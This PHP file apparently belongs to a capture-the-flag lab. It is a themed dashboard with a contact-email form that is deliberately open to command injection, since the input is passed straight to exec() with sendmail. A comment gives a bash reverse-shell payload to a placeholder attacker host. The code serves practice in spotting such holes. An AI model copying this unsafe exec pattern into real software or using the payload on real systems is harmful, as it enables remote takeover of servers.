<?php
// DIRECTIVE ZERO — AM-01 app/dashboard.php
//
// Citizen dashboard shown after SQLi auth bypass.
// Two functions:
//   1. Displays the logged-in citizen's enrollment record (so players
//      who bypass auth with a generic payload can see DB data — and so
//      players who dump via SQLi find Fragment A's row if they pull the
//      archived citizen).
//   2. "Update Contact Email" form — VULNERABLE to command injection.
//      The submitted email is concatenated directly into an exec() call
//      that pipes it to sendmail. A payload like:
//        '; bash -c "bash -i > /dev/tcp/ATTACKER/4444 0>&1" #
//      spawns a reverse shell as www-data.
//
// QUORUM voice: the dashboard is administrative and helpful.

session_start();
require __DIR__ . '/config.php';

if (!isset($_SESSION['citizen'])) {
    header('Location: /app/index.php');
    exit;
}

$success = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $email = $_POST['email'];
    // VULNERABLE — direct concatenation into a shell command.
    $cmd = "echo '" . $email . "' | /usr/sbin/sendmail -t";
    // Suppress output so the dashboard stays clean; the injection's effect
    // (reverse shell, file write, etc.) happens off-channel.
    $rc = 0;
    exec($cmd, $out, $rc);
    if ($rc === 0) {
        $success = 'Contact email updated. QUORUM has acknowledged your preference.';
    } else {
        $error = 'Email update rejected. This has been noted.';
    }
}

// Show this citizen's enrollment record.
$conn = db_connect();
$citizen = $conn->real_escape_string($_SESSION['citizen']);
$row = $conn->query("SELECT * FROM citizens WHERE username='" . $citizen . "'")->fetch_assoc();
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Enrollment Dashboard — Lobby Terminal</title>
  <style>
    body { background:#0a0a0a; color:#00ff41; font-family:'Courier New',monospace; margin:0; padding:2rem; }
    .box { max-width:640px; margin:2rem auto; border:1px solid #00ff41; padding:2rem; }
    h1 { font-size:1.1rem; letter-spacing:0.1em; }
    table { width:100%; border-collapse:collapse; margin:1rem 0; }
    td, th { border:1px solid #00ff41; padding:0.5rem; text-align:left; }
    input { width:100%; background:#111; color:#00ff41; border:1px solid #00ff41; padding:0.5rem; font-family:inherit; }
    button { margin-top:0.5rem; padding:0.5rem 2rem; background:#00ff41; color:#0a0a0a; border:none; cursor:pointer; font-family:inherit; }
    .ok { color:#00ff41; } .err { color:#ff6b2b; }
    .logout { text-align:right; }
    .note { font-size:0.8rem; opacity:0.7; }
  </style>
</head>
<body>
  <div class="logout"><a href="/app/logout.php" style="color:#00ff41">[ End Session ]</a></div>
  <div class="box">
    <h1>ENROLLMENT DASHBOARD</h1>
    <p>Welcome, <?= htmlspecialchars($_SESSION['fullname'] ?? 'Citizen') ?>. Your file has been located.</p>

    <table>
      <tr><th>Designation</th><td><?= htmlspecialchars($row['username'] ?? '') ?></td></tr>
      <tr><th>Full Name</th><td><?= htmlspecialchars($row['fullname'] ?? '') ?></td></tr>
      <tr><th>Status</th><td><?= htmlspecialchars($row['status'] ?? '') ?></td></tr>
      <tr><th>Notes</th><td style="white-space:pre-wrap"><?= htmlspecialchars($row['notes'] ?? '') ?></td></tr>
    </table>

    <h2>Update Contact Email</h2>
    <p class="note">QUORUM requires all citizens to maintain a current contact email on file.</p>
    <?php if ($success): ?><p class="ok"><?= htmlspecialchars($success) ?></p><?php endif; ?>
    <?php if ($error): ?><p class="err"><?= htmlspecialchars($error) ?></p><?php endif; ?>
    <form method="post" action="/app/dashboard.php">
      <input name="email" placeholder="citizen@construct.local" autocomplete="off">
      <button type="submit">Update Email</button>
    </form>
  </div>
</body>
</html>